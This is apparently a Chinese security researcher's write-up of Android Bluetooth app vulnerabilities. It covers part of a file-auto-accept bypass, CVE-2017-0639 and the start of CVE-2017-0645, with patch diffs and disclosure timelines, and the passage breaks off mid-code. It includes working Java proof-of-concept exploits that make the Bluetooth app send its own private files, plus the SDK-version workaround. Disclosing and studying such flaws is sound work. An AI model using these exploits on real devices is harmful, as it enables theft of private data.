&#123;</span><br><span class="line">                    String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);</span><br><span class="line">                    intent.setData(Uri.parse(uriString));</span><br><span class="line">                    sendBroadcast(intent);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-测试方法"><a href="#0x04-测试方法" class="headerlink" title="0x04 测试方法"></a>0x04 测试方法</h3><p>通过蓝牙向测试手机发送文件，此时，手机将会出现提示，要用户拒绝或者接受，这个对话框将会出现约1分钟</p><p>Bluetooth Transfer PendingBluetooth Transfer Pending</p><p>此时运行POC，文件将会自动接收，因此这是一个本地用户交互绕过。如果有恶意程序利用该漏洞一直在后台运行，那么手机将会被强制接收任意蓝牙传入的文件。</p><h3 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h3><p>Google在Framework的AndroidManifest文件中，将android.btopp.intent.action.ACCEPT和DELINE设为保护状态，普通App无法发出携带这些action的Intent</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/res/AndroidManifest.xml b/core/res/AndroidManifest.xml</span><br><span class="line">index ec712bb..011884c 100644</span><br><span class="line">--- a/core/res/AndroidManifest.xml</span><br><span class="line">+++ b/core/res/AndroidManifest.xml</span><br><span class="line">@@ -199,6 +199,8 @@</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.OPEN_INBOUND&quot; /&gt;    </span><br><span class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.TRANSFER_COMPLETE&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.ACCEPT&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.DECLINE&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authchall&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.userconfirmtimeout&quot; /&gt;  </span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authresponse&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h3><pre><code>2017.02.09——提交Google2017.03.01——漏洞确认2017.05.01——补丁发布2017.05.04——漏洞公开</code></pre><h2 id="蓝牙App漏洞系列分析之二CVE-2017-0639"><a href="#蓝牙App漏洞系列分析之二CVE-2017-0639" class="headerlink" title="蓝牙App漏洞系列分析之二CVE-2017-0639"></a>蓝牙App漏洞系列分析之二CVE-2017-0639</h2><h3 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h3><p>Android本月的安全公告，修复了我们发现的另一个蓝牙App信息泄露漏洞，该漏洞允许攻击者获取 bluetooth用户所拥有的私有文件，绕过了将应用数据与其他应用隔离的操作系统防护功能。</p><p>漏洞信息如下：</p><pre><code>CVE: CVE-2017-0639BugID: A-35310991严重性: 高危漏洞类型: 信息泄露Updated AOSP versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2</code></pre><h3 id="0x02-漏洞缘起"><a href="#0x02-漏洞缘起" class="headerlink" title="0x02 漏洞缘起"></a>0x02 漏洞缘起</h3><p>在发现这个漏洞之前，我浏览了Android 2017年2月的安全公告，其中两个并排的高危信息泄露漏洞引起了我的注意：</p><pre><code>CVE-2017-0420: AOSP邮件中的信息泄露漏洞CVE-2017-0414: AOSP短信中的信息泄露漏洞</code></pre><p>查看这两个信息漏洞的补丁注释，分别为</p><pre><code>Don’t allow file attachment from /data through GET_CONTENTThirdparty canattach private files from “/data/data/com.android.messaging/“directory to the messaging app。</code></pre><p>涵义非常清晰，似乎邮件和短信App均遗漏了对发送的文件进行验证，本地攻击者可以添加App私有目录的数据文件发送出去，从而破坏了Android沙箱所提供的应用数据相互隔离的安全防护功能。</p><p>这两个漏洞可以归纳为一类针对具有对外发送或共享功能App的攻击，Android中会不会还有类似的功能具有类似的漏洞？另外，注意到上述两个漏洞的发现者并非一人，只是巧合地同时出现在2月份的安全公告之中，发现者似乎还没有意识到这类攻击的通用性，也许真的还没有搜刮干净？</p><h3 id="0x03-攻击面——蓝牙的信息分享"><a href="#0x03-攻击面——蓝牙的信息分享" class="headerlink" title="0x03 攻击面——蓝牙的信息分享"></a>0x03 攻击面——蓝牙的信息分享</h3><p>除了短信、邮件，很容易想到蓝牙也是Android一个很重要的信息对外发送出口。通常，我们选择一个文件的分享按钮，选择蓝牙，就可以触发蓝牙的文件发送功能，这是通过蓝牙App暴露的BluetoothOppLauncherActivity所实现。该Activity根据传入的Intent.ACTION_SEND或<br>Intent.ACTION_SEND_MULTIPLE，启动一个线程处理单个文件或多个文件的对外发送。主要代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Other application is trying to share a file via Bluetooth,</span></span><br><span class="line"><span class="comment">  * probably Pictures, videos, or vCards. The Intent should contain</span></span><br><span class="line"><span class="comment">  * an EXTRA_STREAM with the data to attach.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">if</span> (action.equals(Intent.ACTION_SEND)) &#123;</span><br><span class="line">     <span class="comment">// <span class="doctag">TODO:</span> handle type == null case</span></span><br><span class="line">     <span class="keyword">final</span> String type = intent.getType();</span><br><span class="line">     <span class="keyword">final</span> Uri stream = (Uri)intent.getParcelableExtra(Intent.EXTRA_STREAM);</span><br><span class="line">     CharSequence extra_text = intent.getCharSequenceExtra(Intent.EXTRA_TEXT);</span><br><span class="line">     <span class="comment">// If we get ACTION_SEND intent with EXTRA_STREAM, we&#x27;ll use the</span></span><br><span class="line">     <span class="comment">// uri data;</span></span><br><span class="line">     <span class="comment">// If we get ACTION_SEND intent without EXTRA_STREAM, but with</span></span><br><span class="line">     <span class="comment">// EXTRA_TEXT, we will try send this TEXT out; Currently in</span></span><br><span class="line">     <span class="comment">// Browser, share one link goes to this case;</span></span><br><span class="line">     <span class="keyword">if</span> (stream != <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_SEND intent: Uri = &quot;</span> + stream + <span class="string">&quot;; mimetype = &quot;</span></span><br><span class="line">                     + type);</span><br><span class="line">         <span class="comment">// Save type/stream, will be used when adding transfer</span></span><br><span class="line">         <span class="comment">// session to DB.</span></span><br><span class="line">         Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.<span class="keyword">this</span>)</span><br><span class="line">                     .saveSendingFileInfo(type,stream.toString(), <span class="keyword">false</span>);</span><br><span class="line">                 <span class="comment">//Done getting file info..Launch device picker and finish this activity</span></span><br><span class="line">                     launchDevicePicker();</span><br><span class="line">                     finish();</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;);</span><br><span class="line">             t.start();</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             Log.w(TAG,<span class="string">&quot;Error trying to do set text...File not created!&quot;</span>);</span><br><span class="line">             finish();</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         Log.e(TAG, <span class="string">&quot;type is null; or sending file URI is null&quot;</span>);</span><br><span class="line">         finish();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Intent.ACTION_SEND_MULTIPLE)) &#123;</span><br><span class="line">     <span class="keyword">final</span> String mimeType = intent.getType();</span><br><span class="line">     <span class="keyword">final</span> ArrayList&lt;Uri&gt; uris = intent.getParcelableArrayListExtra(Intent.EXTRA_STREAM);</span><br><span class="line">     <span class="keyword">if</span> (mimeType != <span class="keyword">null</span> &amp;&amp; uris != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_SHARE_MULTIPLE intent: uris &quot;</span> + uris + <span class="string">&quot;\n Type= &quot;</span></span><br><span class="line">                     + mimeType);</span><br><span class="line">         Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.<span class="keyword">this</span>)</span><br><span class="line">                     .saveSendingFileInfo(mimeType,uris, <span class="keyword">false</span>);</span><br><span class="line">                 <span class="comment">//Done getting file info..Launch device picker</span></span><br><span class="line">                 <span class="comment">//and finish this activity</span></span><br><span class="line">                 launchDevicePicker();</span><br><span class="line">                 finish();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         t.start();</span><br></pre></td></tr></table></figure><p>那么，传入蓝牙App私有数据试试！先寻找bluetooth所拥有的私有文件，</p><blockquote><p>angler:/ # find /data -user bluetooth -exec ls -al {} ; 2&gt; /dev/null</p></blockquote><p>可以选定两个bluetooth所拥有、有实质内容的文件作为发送对象，file:///data/user_de/0/com.android.bluetooth/databases/btopp.db和file:///data/misc/bluedroid/bt_config.conf</p><p>很快可以写出PoC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button m_btnSendPriv = <span class="keyword">null</span>;</span><br><span class="line">    Button m_btnSendMPriv = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String PRIV_FILE_URI1 = <span class="string">&quot;file:///data/user_de/0/com.android.bluetooth/databases/btopp.db&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String PRIV_FILE_URI2 = <span class="string">&quot;file:///data/misc/bluedroid/bt_config.conf&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        m_btnSendPriv = (Button)findViewById(R.id.send_private);</span><br><span class="line">        m_btnSendPriv.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_SEND);</span><br><span class="line">                intent.setType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                Uri uri = Uri.parse(PRIV_FILE_URI1);</span><br><span class="line">                intent.putExtra(Intent.EXTRA_STREAM, uri);</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        m_btnSendMPriv = (Button)findViewById(R.id.send_private_multiple);</span><br><span class="line">        m_btnSendMPriv.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_SEND_MULTIPLE);</span><br><span class="line">                intent.setType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">                ArrayList&lt;Uri&gt; uris = <span class="keyword">new</span> ArrayList&lt;Uri&gt;();</span><br><span class="line">                uris.add(Uri.parse(PRIV_FILE_URI1));</span><br><span class="line">                uris.add(Uri.parse(PRIV_FILE_URI2));</span><br><span class="line">                intent.putExtra(Intent.EXTRA_STREAM, uris);</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppLauncherActivity&quot;</span>));</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-进一步分析"><a href="#0x04-进一步分析" class="headerlink" title="0x04 进一步分析"></a>0x04 进一步分析</h3><p>真的那么简单吗？编译PoC，运行却抛出了安全异常！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--------- beginning of crash</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: FATAL EXCEPTION: main</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: Process: ms509.com.testaospbluetoothopplauncher, PID: 16171</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: android.os.FileUriExposedException: file:&#x2F;&#x2F;&#x2F;data&#x2F;user_de&#x2F;0&#x2F;com.android.bluetooth&#x2F;databases&#x2F;btopp.db exposed beyond app through ClipData.Item.getUri()</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.os.StrictMode.onFileUriExposed(StrictMode.java:1799)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.net.Uri.checkFileUriExposed(Uri.java:2346)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.content.ClipData.prepareToLeaveProcess(ClipData.java:832)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.content.Intent.prepareToLeaveProcess(Intent.java:8909)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.content.Intent.prepareToLeaveProcess(Intent.java:8894)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.app.Instrumentation.execStartActivity(Instrumentation.java:1517)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.app.Activity.startActivityForResult(Activity.java:4224)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.support.v4.app.BaseFragmentActivityJB.startActivityForResult(BaseFragmentActivityJB.java:50)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.support.v4.app.FragmentActivity.startActivityForResult(FragmentActivity.java:79)</span><br><span class="line">06-12 10:32:43.930 16171 16171 E AndroidRuntime: at android.app.Activity.startActivityForResult(Activity.java:4183)</span><br></pre></td></tr></table></figure><p>原来触发了FileUriExposed错误，出于安全考虑，Android SDK 23以上就不能在Intent中传递file:// Uri，见官方说明：</p><p>对于面向 Android 7.0 的应用，Android 框架执行的 StrictMode API 政策禁止在您的应用外部公开 file:// URI。如果一项包含文件 URI 的 intent 离开您的应用，则应用出现故障，并出现 FileUriExposedException 异常。要在应用间共享文件，您应发送一项 content:// URI，并授予 URI 临时访问权限。进行此授权的最简单方式是使用 FileProvider 类。</p><p>似乎宣判了死刑！心有不甘，继续分析BluetoothOppLauncherActivity后面的文件处理流程，调用链为saveSendingFileInfo–&gt; generateFileInfo，查看generateFileInfo函数，我们发现其实是支持传入file:// URI的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BluetoothOppSendFileInfo <span class="title">generateFileInfo</span><span class="params">(Context context, Uri uri,</span></span></span><br><span class="line"><span class="function"><span class="params">        String type)</span> </span>&#123;</span><br><span class="line">    ContentResolver contentResolver = context.getContentResolver();</span><br><span class="line">    String scheme = uri.getScheme();</span><br><span class="line">    String fileName = <span class="keyword">null</span>;</span><br><span class="line">    String contentType;</span><br><span class="line">    <span class="keyword">long</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Support all Uri with &quot;content&quot; scheme</span></span><br><span class="line">    <span class="comment">// This will allow more 3rd party applications to share files via</span></span><br><span class="line">    <span class="comment">// bluetooth</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;content&quot;</span>.equals(scheme)) &#123;</span><br><span class="line">        contentType = contentResolver.getType(uri);</span><br><span class="line">        Cursor metadataCursor;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            metadataCursor = contentResolver.query(uri, <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                    OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE</span><br><span class="line">            &#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLiteException e) &#123;</span><br><span class="line">            <span class="comment">// some content providers don&#x27;t support the DISPLAY_NAME or SIZE columns</span></span><br><span class="line">            metadataCursor = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;generateFileInfo: Permission error, could not access URI: &quot;</span> + uri);</span><br><span class="line">            <span class="keyword">return</span> SEND_FILE_INFO_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (metadataCursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (metadataCursor.moveToFirst()) &#123;</span><br><span class="line">                    fileName = metadataCursor.getString(</span><br><span class="line">                            metadataCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));</span><br><span class="line">                    length = metadataCursor.getLong(</span><br><span class="line">                            metadataCursor.getColumnIndex(OpenableColumns.SIZE));</span><br><span class="line">                    <span class="keyword">if</span> (D) Log.d(TAG, <span class="string">&quot;fileName = &quot;</span> + fileName + <span class="string">&quot; length = &quot;</span> + length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                metadataCursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fileName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// use last segment of URI if DISPLAY_NAME query fails</span></span><br><span class="line">            fileName = uri.getLastPathSegment();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(scheme)) &#123; <span class="comment">// Notice!!!</span></span><br><span class="line">        fileName = uri.getLastPathSegment();</span><br><span class="line">        contentType = type;</span><br><span class="line">        File f = <span class="keyword">new</span> File(uri.getPath());</span><br><span class="line">        length = f.length();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// currently don&#x27;t accept other scheme</span></span><br><span class="line">        <span class="keyword">return</span> SEND_FILE_INFO_ERROR;</span><br></pre></td></tr></table></figure><p>进一步查阅相关资料发现，原来FileUriExposed错误只是SDK引入的一项安全机制，仅仅是为了防止Intent的接收方访问发起方的私有文件。但是在我们这种攻击场景下，我们是要Intent的接收方BluetoothOppLauncherActivity访问其自己的私有文件，而且查看上述代码，既有对file:// URI的支持，也缺乏对文件是否属于私有目录的验证，Why not?</p><p>既然是SDK 23以后引入的安全机制，那么我们把build.gradle中的targetSdkVersion从原先的25改为23，重新编译运行，就可以将Bluetooth App的私有文件通过蓝牙发送出去，而这些文件原本连用户均无法获取，这就打破了Android沙箱的应用间数据隔离机制。至此，大功告成！<br>success</p><h3 id="0x05-时间线"><a href="#0x05-时间线" class="headerlink" title="0x05 时间线"></a>0x05 时间线</h3><pre><code>2017.02.13: 提交Google2017.03.01: 漏洞确认，初始评级为高2017.06.05: 补丁发布2017.06.12: 漏洞公开</code></pre><h2 id="蓝牙App漏洞系列分析之三CVE-2017-0645"><a href="#蓝牙App漏洞系列分析之三CVE-2017-0645" class="headerlink" title="蓝牙App漏洞系列分析之三CVE-2017-0645"></a>蓝牙App漏洞系列分析之三CVE-2017-0645</h2><h3 id="0x01-漏洞简介-1"><a href="#0x01-漏洞简介-1" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h3><p>Android 6月的安全公告，同时还修复了我们发现的一个蓝牙 App 提权中危漏洞，该漏洞允许手机本地无权限的恶意程序构造一个仿冒的 Provider ，并获取 Provider 所指向文件的读写权限，可用于写 SD 卡或者蓝牙共享数据库，漏洞详情如下：</p><pre><code>CVE: CVE-2017-0645BugID: A-35310991严重性: 中危漏洞类型: 提权Updated AOSP versions: 6.0.1, 7.0, 7.1.1, 7.1.2</code></pre><h3 id="0x02-漏洞分析-1"><a href="#0x02-漏洞分析-1" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>该漏洞其实是一个常规的 Android 组件暴露漏洞，跟我们上一个分析的蓝牙漏洞一样，我们知道在蓝牙 App 中 BluetoothOppLauncherActivity 是可以被第三方应用启动的。这一次，我们来看 onCreate 函数中传入 Intent action 为 android.btopp.intent.action.OPEN 的处理流程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN)) &#123;</span><br><span class="line">    Uri uri = getIntent().getData();</span><br><span class="line">    <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_OPEN intent: Uri = &quot;</span> + uri);</span><br><span class="line"></span><br><span class="line">    Intent intent1 = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent1.setAction(action);</span><br><span class="line">    intent1.setClassName(Constants.THIS_PACKAGE_NAME, BluetoothOppReceiver.class.getName());</span><br><span class="line">    intent1.setDataAndNormalize(uri);</span><br><span class="line">    <span class="keyword">this</span>.sendBroadcast(intent1);</span><br><span class="line">    finish();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>转到 BluetoothOppReceiver 进行处理。接着查看 BluetoothOppReceiver 的 onReceive 函数，由于Intent 可控，这里蓝牙 App 将会取出 intent 中的 Data 进行数据库查询，然后取出 transInfo ，最后进入 BluetoothOppUtility.openReceivedFile 函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN) || action.equals(Constants.ACTION_LIST)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (V) &#123;</span><br><span class="line">        <span class="keyword">if</span> (action.equals(Constants.ACTION_OPEN)) &#123;</span><br><span class="line">            Log.v(TAG, <span class="string">&quot;Receiver open for &quot;</span> + intent.getData());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.v(TAG, <span class="string">&quot;Receiver list for &quot;</span> + intent.getData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BluetoothOppTransferInfo transInfo = <span class="keyword">new</span> BluetoothOppTransferInfo();</span><br><span class="line">    Uri uri = intent.getData();  <span class="comment">//Intent可控！</span></span><br><span class="line">    transInfo = BluetoothOppUtility.queryRecord(context, uri);</span><br><span class="line">    <span class="keyword">if</span> (transInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Error: Can not get data from db&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (transInfo.mDirection == BluetoothShare.DIRECTION_INBOUND</span><br><span class="line">            &amp;&amp; BluetoothShare.isStatusSuccess(transInfo.mStatus)) &#123;</span><br><span class="line">        <span class="comment">// if received file successfully, open this file</span></span><br><span class="line">        <span class="comment">// transInfo可控！</span></span><br><span class="line">        BluetoothOppUtility.openReceivedFile(context, transInfo.mFileName,</span><br><span class="line">                transInfo.mFileType, transInfo.mTimeStamp, 